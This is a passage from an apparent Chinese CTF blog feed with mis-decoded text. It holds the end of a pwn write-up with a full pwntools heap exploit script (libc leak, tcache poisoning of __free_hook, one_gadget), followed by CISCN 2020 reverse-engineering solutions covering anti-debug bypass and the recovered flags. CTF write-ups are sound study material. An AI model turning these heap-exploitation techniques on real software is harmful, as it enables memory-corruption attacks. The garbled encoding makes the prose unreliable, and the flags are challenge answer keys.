ä¸ºç¨‹åºçš„å†™æ³•ï¼Œä¼šç›´æ¥è¾“å‡ºä¸€ä¸‹<code>.</code>çš„æ–‡ä»¶åï¼Œå†æ¬¡è°ƒç”¨ä¼šè¾“å‡º<code>..</code>çš„æ–‡ä»¶åï¼Œä¹Ÿæ˜¯<code>0x13</code>çš„åç§»å¤„ã€‚é‚£ä¹ˆæƒ³åŠæ³•æº¢å‡ºä¿®æ”¹è¿™é™„è¿‘çš„å†…å­˜ï¼Œåœ¨æ‰“å°æ–‡ä»¶åçš„æ—¶å€™ï¼ŒæŠŠlibcåœ°å€ä¹Ÿç»™å°å‡ºæ¥ã€‚</p><h3 id="æ”»å‡»æ€è·¯-4"><a href="#æ”»å‡»æ€è·¯-4" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><ul><li>å…ˆç”³è¯·8ä¸ªå †ï¼Œç„¶åé‡Šæ”¾å®Œï¼Œè®©å…¶å­˜åœ¨ä¸€ä¸ªåœ¨unsortbinçš„chunkï¼Œä¸”ç•™å‡ºä¸€ä¸ªå‡†å¤‡ä¸Šæº¢å‡ºæ”»å‡»çš„chunk</li><li>openfileä¸€ä¸‹ï¼Œåœ¨heapä¸Šç”³è¯·ä¸€ä¸ªå·¨å¤§çš„chunk</li><li>ä¸Šæº¢å‡ºæ”»å‡»ï¼ŒæŠŠåŠ å…¥unsortbinçš„chunkçš„sizeç»™ä¿®æ”¹å¤§ä¸€ç‚¹,è¦†ç›–åˆ°ä¸Šé¢é‚£ä¸ªå·¨å¤§çš„chunkï¼Œä¸”è¿™ä¸ªå·¨å¤§å †çš„next chunkçš„prev size è¦å¡«ä¸Šåˆé€‚çš„å¤§å°ï¼Œç»•è¿‡å¯¹unsortbin çš„æ£€æŸ¥ã€‚</li><li>closeä¸€ä¸‹ï¼Œä¼šåœ¨åˆšåˆšå·¨å¤§çš„chunkä¸­ç•™ä¸‹direntç»“æ„ä½“ï¼Œå…¶ä¸­ä¼šåŒ…å«filename</li><li>ç”³è¯·å †åˆ°<code>..</code>è¿™ä¸ªæ–‡ä»¶åçš„é™„è¿‘ï¼Œå› ä¸ºæ˜¯unsortbinï¼Œä¼šåœ¨å…¶ä¸‹é¢ç•™ä¸‹libcåœ°å€ï¼Œå‡†å¤‡æ³„æ¼ï¼ˆè¿™ä¸ªè¦æ³¨æ„ï¼Œå°½é‡ä¸è¦ç ´ådirentç»“æ„ä½“çš„æ•°æ®ï¼Œç ´ååå®¹æ˜“æ— æ³•è¾“å‡ºfilenameï¼‰</li><li>ä¸Šæº¢æ”»å‡»<code>..</code>çš„æ–‡ä»¶åï¼Œç»™å…¶ä¿®æ”¹å…¶ä»–åˆé€‚çš„åå­—ï¼Œæ³„æ¼å‡ºlibcåœ°å€</li><li>å‰©ä¸‹çš„å°±ç®€å•äº†ï¼Œä¸Šæº¢æ”»å‡»tcache chainï¼Œä¿®æ”¹ä¸ºfree hook</li><li>æ”»å‡»free hook ä¸ºone gadget</li></ul><h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27411</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,size)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sla(<span class="hljs-string">'ize'</span>,str(size))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,offset,size,data)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sla(<span class="hljs-string">'set'</span>,str(offset))    sla(<span class="hljs-string">'ize'</span>,str(size))    sa(<span class="hljs-string">'tent'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">openfile</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'4'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">closefile</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'5'</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>):    add(i,<span class="hljs-number">0x100</span>)add(<span class="hljs-number">8</span>,<span class="hljs-number">0x18</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):    free(i)openfile()add(<span class="hljs-number">9</span>,<span class="hljs-number">0x18</span>)add(<span class="hljs-number">0</span>,<span class="hljs-number">0x18</span>)free(<span class="hljs-number">7</span>)data = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x8040</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x110</span>)edit(<span class="hljs-number">8</span>,<span class="hljs-number">-0x120</span>,<span class="hljs-number">0x100</span>,data)data = p64(<span class="hljs-number">0x8170</span>) + p64(<span class="hljs-number">0x20</span>)edit(<span class="hljs-number">0</span>,<span class="hljs-number">-0x30</span>,<span class="hljs-number">0x18</span>,data)closefile()add(<span class="hljs-number">1</span>,<span class="hljs-number">0x90</span>)add(<span class="hljs-number">2</span>,<span class="hljs-number">0x70</span>)add(<span class="hljs-number">3</span>,<span class="hljs-number">0x60</span>)data = p64(<span class="hljs-number">0x121111111111</span>)[:<span class="hljs-number">6</span>]print(data)edit(<span class="hljs-number">0</span>,<span class="hljs-number">-0x7fd8</span><span class="hljs-number">-0x30</span>+<span class="hljs-number">2</span>,<span class="hljs-number">0x8</span>,data)closefile()ru(<span class="hljs-string">'\x12'</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3ebca0</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)data = p64(<span class="hljs-number">0x000000000000</span>)[:<span class="hljs-number">6</span>]edit(<span class="hljs-number">0</span>,<span class="hljs-number">-0x7fd8</span><span class="hljs-number">-0x30</span>+<span class="hljs-number">2</span>,<span class="hljs-number">0x8</span>,data)free_hook = <span class="hljs-number">0x3ed8e8</span> + libc_baseone = <span class="hljs-number">0x4f322</span> + libc_basedata = <span class="hljs-string">'1'</span> * <span class="hljs-number">8</span>edit(<span class="hljs-number">0</span>,<span class="hljs-number">-0x82a0</span>,<span class="hljs-number">8</span>,p64(free_hook))add(<span class="hljs-number">4</span>,<span class="hljs-number">0x100</span>)add(<span class="hljs-number">5</span>,<span class="hljs-number">0x100</span>)edit(<span class="hljs-number">5</span>,<span class="hljs-number">0</span>,<span class="hljs-number">8</span>,p64(one))free(<span class="hljs-number">4</span>)<span class="hljs-comment"># debug()</span>itr()</code></pre></div>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ciscn 2020åˆèµ›éƒ¨åˆ†é¢˜ç›®</title>
    <link href="/2020/08/20/ciscn%202020%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/"/>
    <url>/2020/08/20/ciscn%202020%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="ciscn-2020åˆèµ›éƒ¨åˆ†é¢˜ç›®"><a href="#ciscn-2020åˆèµ›éƒ¨åˆ†é¢˜ç›®" class="headerlink" title="ciscn  2020åˆèµ›éƒ¨åˆ†é¢˜ç›®"></a>ciscn  2020åˆèµ›éƒ¨åˆ†é¢˜ç›®</h1><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="z3"><a href="#z3" class="headerlink" title="z3"></a>z3</h3><p>ï¿¼<br>çœ‹èµ·æ¥åƒæ˜¯éé½æ¬¡çº¿æ€§æ–¹ç¨‹ï¼Œé‚£å°±æ˜¯å°±æ˜¯ä¸€ä¸ªè§£æ–¹ç¨‹:</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> numpy <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> npa = np.array([[<span class="hljs-number">12</span>, <span class="hljs-number">53</span>, <span class="hljs-number">6</span>,<span class="hljs-number">34</span>,<span class="hljs-number">58</span>,<span class="hljs-number">36</span>,<span class="hljs-number">1</span>],            [<span class="hljs-number">83</span>,<span class="hljs-number">85</span>,<span class="hljs-number">12</span>,<span class="hljs-number">73</span>,<span class="hljs-number">27</span>,<span class="hljs-number">96</span>,<span class="hljs-number">52</span>],            [<span class="hljs-number">78</span>,<span class="hljs-number">53</span>,<span class="hljs-number">24</span>,<span class="hljs-number">36</span>,<span class="hljs-number">86</span>,<span class="hljs-number">25</span>,<span class="hljs-number">46</span>],            [<span class="hljs-number">39</span>,<span class="hljs-number">78</span>,<span class="hljs-number">52</span>,<span class="hljs-number">9</span>,<span class="hljs-number">62</span>,<span class="hljs-number">37</span>,<span class="hljs-number">84</span>],            [<span class="hljs-number">23</span>,<span class="hljs-number">6</span>,<span class="hljs-number">14</span>,<span class="hljs-number">74</span>,<span class="hljs-number">48</span>,<span class="hljs-number">12</span>,<span class="hljs-number">83</span>],            [<span class="hljs-number">27</span>,<span class="hljs-number">85</span>,<span class="hljs-number">92</span>,<span class="hljs-number">42</span>,<span class="hljs-number">48</span>,<span class="hljs-number">15</span>,<span class="hljs-number">72</span>],            [<span class="hljs-number">4</span>,<span class="hljs-number">6</span>,<span class="hljs-number">3</span>,<span class="hljs-number">67</span>,<span class="hljs-number">0</span>,<span class="hljs-number">26</span>,<span class="hljs-number">68</span>]])b = np.array([[<span class="hljs-number">20247</span>],[<span class="hljs-number">40182</span>],[<span class="hljs-number">36315</span>],[<span class="hljs-number">36518</span>],[<span class="hljs-number">26921</span>],[<span class="hljs-number">39185</span>],[<span class="hljs-number">16546</span>]])result=[]x = np.linalg.solve(a, b)result += x.tolist()b = np.array([[<span class="hljs-number">12094</span>],[<span class="hljs-number">25270</span>],[<span class="hljs-number">19330</span>],[<span class="hljs-number">18540</span>],[<span class="hljs-number">16386</span>],[<span class="hljs-number">21207</span>],[<span class="hljs-number">11759</span>]])x = np.linalg.solve(a, b)result += x.tolist()b = np.array([[<span class="hljs-number">10460</span>],[<span class="hljs-number">25613</span>],[<span class="hljs-number">21135</span>],[<span class="hljs-number">24891</span>],[<span class="hljs-number">18305</span>],[<span class="hljs-number">27415</span>],[<span class="hljs-number">12855</span>]])x = np.linalg.solve(a, b)result += x.tolist()b = np.array([[<span class="hljs-number">10899</span>],[<span class="hljs-number">24927</span>],[<span class="hljs-number">20670</span>],[<span class="hljs-number">22926</span>],[<span class="hljs-number">18006</span>],[<span class="hljs-number">23345</span>],[<span class="hljs-number">12602</span>]])x = np.linalg.solve(a, b)result += x.tolist()b = np.array([[<span class="hljs-number">12304</span>],[<span class="hljs-number">26622</span>],[<span class="hljs-number">19807</span>],[<span class="hljs-number">22747</span>],[<span class="hljs-number">14233</span>],[<span class="hljs-number">24736</span>],[<span class="hljs-number">10064</span>]])x = np.linalg.solve(a, b)result += x.tolist()b = np.array([[<span class="hljs-number">14169</span>],[<span class="hljs-number">35155</span>],[<span class="hljs-number">28962</span>],[<span class="hljs-number">33273</span>],[<span class="hljs-number">21796</span>],[<span class="hljs-number">35185</span>],[<span class="hljs-number">14877</span>]])x = np.linalg.solve(a, b)result += x.tolist()flag=<span class="hljs-string">''</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> result:    <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> i:        flag+=chr(int(f+<span class="hljs-number">0.5</span>))print(flag)</code></pre></div><h3 id="hyperthreading"><a href="#hyperthreading" class="headerlink" title="hyperthreading"></a>hyperthreading</h3><h4 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h4><p>ä¸»ç¨‹åºå¾ˆç®€å•ï¼Œè¦æ±‚è¾“å…¥42ä½çš„flagã€‚</p><div class="hljs"><pre><code class="hljs undefined">Handles = CreateThread(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, StartAddress, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);v5 = CreateThread(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, loc_401200, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);CreateThread(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)sub_401240, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);WaitForMultipleObjects(<span class="hljs-number">2</span>u, &amp;Handles, <span class="hljs-number">1</span>, <span class="hljs-number">0xFFFFFFFF</span>);</code></pre></div><p>è¿™é‡Œå¼€å§‹å¼€å¤šçº¿ç¨‹ã€‚</p><div class="hljs"><pre><code class="hljs undefined">void __stdcall __noreturn sub_401240(LPVOID lpThreadParameter)&#123;  <span class="hljs-keyword">while</span> ( !IsDebuggerPresent() )    ;  puts((int)<span class="hljs-string">"debug!\n"</span>);  <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);&#125;</code></pre></div><p>è¿™é‡Œé¢åˆ†åˆ«æœ‰ä¸€ä¸ªåè°ƒè¯•ã€‚ç”¨çš„IsDebuggerPresentã€‚<br>ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼<br>è¿˜æœ‰å¯¹ä½ è¾“å…¥çš„ä¸œè¥¿è¿›è¡Œå¤„ç†ï¼Œå¤„ç†å®Œä»¥åä¸</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-number">402150</span> key             db <span class="hljs-number">0</span>DDh,<span class="hljs-number">5</span>Bh,<span class="hljs-number">9</span>Eh,<span class="hljs-number">1</span>Dh,<span class="hljs-number">20</span>h,<span class="hljs-number">9</span>Eh,<span class="hljs-number">90</span>h,<span class="hljs-number">91</span>h,<span class="hljs-number">2</span> dup(<span class="hljs-number">90</span>h),<span class="hljs-number">91</span>h.rdata:<span class="hljs-number">00402150</span>                                         ; DATA XREF: main1+<span class="hljs-number">96</span>â†‘r.rdata:<span class="hljs-number">00402150</span>                 db <span class="hljs-number">92</span>h,<span class="hljs-number">0</span>DEh,<span class="hljs-number">8</span>Bh,<span class="hljs-number">11</span>h,<span class="hljs-number">0</span>D1h,<span class="hljs-number">1</span>Eh,<span class="hljs-number">9</span>Eh,<span class="hljs-number">8</span>Bh,<span class="hljs-number">51</span>h,<span class="hljs-number">11</span>h.rdata:<span class="hljs-number">00402150</span>                 db <span class="hljs-number">50</span>h,<span class="hljs-number">51</span>h,<span class="hljs-number">8</span>Bh,<span class="hljs-number">9</span>Eh,<span class="hljs-number">2</span> dup(<span class="hljs-number">5</span>Dh),<span class="hljs-number">11</span>h,<span class="hljs-number">8</span>Bh,<span class="hljs-number">90</span>h,<span class="hljs-number">12</span>h,<span class="hljs-number">91</span>h.rdata:<span class="hljs-number">00402150</span>                 db <span class="hljs-number">50</span>h,<span class="hljs-number">12</span>h,<span class="hljs-number">0</span>D2h,<span class="hljs-number">91</span>h,<span class="hljs-number">92</span>h,<span class="hljs-number">1</span>Eh,<span class="hljs-number">9</span>Eh,<span class="hljs-number">90</span>h,<span class="hljs-number">0</span>D2h,<span class="hljs-number">9</span>Fh</code></pre></div><p>è¿™42ä¸ªæ•°æ®è¿›è¡Œå¯¹æ¯”ã€‚</p><p>é‚£ä¹ˆæ€è·¯å°±æ˜¯è¿‡äº†åè°ƒè¯•ï¼Œå®šä½å…³é”®å¤„ç†è¾“å…¥çš„ä»£ç å¤„ï¼Œè¿›è¡Œç¡®å®šå…¶æ˜¯æ€ä¹ˆæ“ä½œæ•°æ®çš„ï¼Œä½†æ˜¯çœ‹äº†ä¸€ä¼šæ²¡æœ‰æ‰¾åˆ°ï¼Œå°±å¼€å§‹æƒ³åŠæ³•å¯»æ‰¾å­—ç¬¦æ˜ å°„æ¥ç¢°æ’flagã€‚</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-number">1</span> &gt; <span class="hljs-number">0x92</span><span class="hljs-number">2</span> &gt; <span class="hljs-number">0xd2</span><span class="hljs-number">3</span> &gt; <span class="hljs-number">0x12</span><span class="hljs-number">4</span> &gt; <span class="hljs-number">0x51</span><span class="hljs-number">5</span> &gt; <span class="hljs-number">0x91</span><span class="hljs-number">6</span> &gt; <span class="hljs-number">0xd1</span><span class="hljs-number">7</span> &gt; <span class="hljs-number">0x11</span><span class="hljs-number">8</span> &gt; <span class="hljs-number">0x50</span><span class="hljs-number">9</span>&gt; <span class="hljs-number">0x90</span><span class="hljs-number">0</span> &gt; <span class="hljs-number">0x52</span>a &gt; <span class="hljs-number">0x9e</span>c &gt; <span class="hljs-number">0x1e</span>d &gt; <span class="hljs-number">0x5d</span> s &gt; <span class="hljs-number">0x22</span>- &gt; <span class="hljs-number">0x8b</span>f &gt; <span class="hljs-number">0xdd</span>l &gt; <span class="hljs-number">0x5b</span>a &gt; <span class="hljs-number">0x9e</span>g &gt; <span class="hljs-number">0x1d</span></code></pre></div><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-type">key</span> = [<span class="hljs-number">0xDD</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x90</span>,  <span class="hljs-number">0x91</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>,   <span class="hljs-number">0x91</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x51</span>,   <span class="hljs-number">0x11</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x90</span>,   <span class="hljs-number">0x12</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x90</span>,   <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x9F</span>]</code></pre></div><p>ç„¶åè¿›è¡Œä¸€ä½ä½æ›¿æ¢ï¼Œè·å¾—flagï¼š</p><div class="hljs"><pre><code class="hljs undefined">flag&#123;a959951b<span class="hljs-number">-76</span>ca<span class="hljs-number">-4784</span>-add7<span class="hljs-number">-93583251</span>ca92&#125;</code></pre></div><p>ä¸»ç¨‹åºå¾ˆç®€å•ï¼Œè¦æ±‚è¾“å…¥42ä½çš„flagã€‚</p><div class="hljs"><pre><code class="hljs undefined">Handles = CreateThread(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, StartAddress, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);v5 = CreateThread(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, loc_401200, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);CreateThread(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)sub_401240, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);WaitForMultipleObjects(<span class="hljs-number">2</span>u, &amp;Handles, <span class="hljs-number">1</span>, <span class="hljs-number">0xFFFFFFFF</span>);</code></pre></div><p>å¼€å§‹æ–°çš„çº¿ç¨‹ï¼š</p><div class="hljs"><pre><code class="hljs undefined">void __stdcall __noreturn sub_401240(LPVOID lpThreadParameter)&#123;  <span class="hljs-keyword">while</span> ( !IsDebuggerPresent() )    ;  puts((int)<span class="hljs-string">"debug!\n"</span>);  <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);&#125;</code></pre></div><p>è¿™æœ‰ä¸€ä¸ªåè°ƒè¯•ã€‚ç”¨çš„IsDebuggerPresentï¼Œè¿‡çš„åŠæ³•å¾ˆç®€å•ï¼Œåœ¨x64dbgä¸­åœ¨è¿›å…¥IsDebuggerPresentæ—¶ï¼Œè¾“å…¥dbhï¼Œéšè—è°ƒè¯•å™¨å³å¯ã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/BPs5Q6.png" srcset="/img/loading.gif" alt></p><p>æµ‹è¯•åœ¨è¿™é‡Œdbhå³å¯ã€‚<br>ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼<br>è¿˜æœ‰å¯¹ä½ çš„inputè¿›è¡Œå¤„ç†ï¼Œå¤„ç†å®Œä»¥åä¸<br><img src="http://qiqianyun.chumen77.xyz/uPic/vXxpNH.png" srcset="/img/loading.gif" alt></p><p>è¿™42ä¸ªæ•°æ®è¿›è¡Œå¯¹æ¯”ã€‚</p><p>å…ˆè¿‡äº†åè°ƒè¯•ï¼Œå®šä½å…³é”®å¤„ç†è¾“å…¥çš„ä»£ç å¤„ï¼ˆ0x401223ï¼‰ï¼Œè¿›è¡Œç¡®å®šå…¶æ˜¯æ€ä¹ˆæ“ä½œæ•°æ®çš„ï¼Œçœ‹äº†ä¸€ä¼šå‘ç°æ²¡æœ‰å¦‚æ­¤ç®€å•ï¼Œä½†æ˜¯å‘ç°ä½ è¾“å…¥ç‰¹å®šå­—ç¬¦ï¼Œç»è¿‡ç¨‹åºå¤„ç†å‡ºæ¥çš„éƒ½æ˜¯ä¸€æ ·çš„:</p><p>éšæ„è¾“å…¥<code>flag{==2332311111111111111111122222222211}</code></p><p><img src="http://qiqianyun.chumen77.xyz/uPic/vXXqPj.png" srcset="/img/loading.gif" alt></p><p>å¯ä»¥æ‰“å°å­—ç¬¦ä¸ç®—å¤šï¼Œè¿™å°±å¯ä»¥å¯ä»¥å»ºç«‹ä¸€ä¸ªæ˜ å°„è¡¨ï¼š<br>è¾“å…¥<code>flag{1234567890qwertyuiopasdfghjkbnmmmmmm}</code></p><p><img src="http://qiqianyun.chumen77.xyz/uPic/3GOgJx.png" srcset="/img/loading.gif" alt></p><p>å¤„ç†å®Œï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/zsN4o0.png" srcset="/img/loading.gif" alt><br>è·å–æ˜ å°„è¡¨ï¼š</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-number">1</span> &gt; <span class="hljs-number">0x92</span><span class="hljs-number">2</span> &gt; <span class="hljs-number">0xd2</span><span class="hljs-number">3</span> &gt; <span class="hljs-number">0x12</span><span class="hljs-number">4</span> &gt; <span class="hljs-number">0x51</span><span class="hljs-number">5</span> &gt; <span class="hljs-number">0x91</span><span class="hljs-number">6</span> &gt; <span class="hljs-number">0xd1</span><span class="hljs-number">7</span> &gt; <span class="hljs-number">0x11</span><span class="hljs-number">8</span> &gt; <span class="hljs-number">0x50</span><span class="hljs-number">9</span>&gt; <span class="hljs-number">0x90</span><span class="hljs-number">0</span> &gt; <span class="hljs-number">0x52</span>f &gt; <span class="hljs-number">0xdd</span>l &gt; <span class="hljs-number">0x5b</span>a &gt; <span class="hljs-number">0x9e</span>g &gt; <span class="hljs-number">0x1d</span>a &gt; <span class="hljs-number">0x9e</span>c &gt; <span class="hljs-number">0x1e</span>d &gt; <span class="hljs-number">0x5d</span> s &gt; <span class="hljs-number">0x22</span>- &gt; <span class="hljs-number">0x8b</span></code></pre></div><p>æå–ä¸€ä¸‹keyï¼š</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-type">key</span> = [<span class="hljs-number">0xDD</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x90</span>,  <span class="hljs-number">0x91</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>,  <span class="hljs-number">0x91</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x51</span>,   <span class="hljs-number">0x11</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x90</span>,   <span class="hljs-number">0x12</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x9F</span>]</code></pre></div><p>ç„¶åè¿›è¡Œä¸€ä½ä½æ›¿æ¢ï¼Œè·å¾—flagï¼š</p><div class="hljs"><pre><code class="hljs undefined">flag&#123;a959951b<span class="hljs-number">-76</span>ca<span class="hljs-number">-4784</span>-add7<span class="hljs-number">-93583251</span>ca92&#125;</code></pre></div><h4 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h4><p>å¯ä»¥ç¡®å®šä¸€ä¸‹idaæ— æ³•è¯†åˆ«çš„æ•°æ®æ®µï¼Œæ˜¯è¢«èŠ±æŒ‡ä»¤å¤„ç†è¿‡äº†ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/yY437o.png" srcset="/img/loading.gif" alt><br>è¿™é‡Œå¼€å§‹å¾€ä¸‹è¯†åˆ«å¼‚å¸¸ï¼Œåœ¨åŠ¨æ€è°ƒè¯•åï¼Œæå–ä¸€ä¸‹æ­£ç¡®çš„æ±‡ç¼–ä»£ç ï¼Œæ ¹æ®æ­£ç¡®çš„ç®—æ³•è¿›è¡Œpatchæ‰èŠ±æŒ‡ä»¤ã€‚ï¼ˆè¿˜æ˜¯æ³¨æ„dbhéšè—ä¸€ä¸‹è°ƒè¯•å™¨ã€‚ï¼‰</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">void</span> __stdcall __<span class="hljs-function">noreturn <span class="hljs-title">sub_401120</span><span class="hljs-params">(LPVOID lpThreadParameter)</span></span>&#123;  <span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// ebx</span>  CreateThread(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, hHandle, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);  WaitForSingleObject(hHandle, <span class="hljs-number">0xFFFFFFFF</span>);  inputs[<span class="hljs-number">0</span>] = (inputs[<span class="hljs-number">0</span>] &lt;&lt; <span class="hljs-number">6</span>) ^ 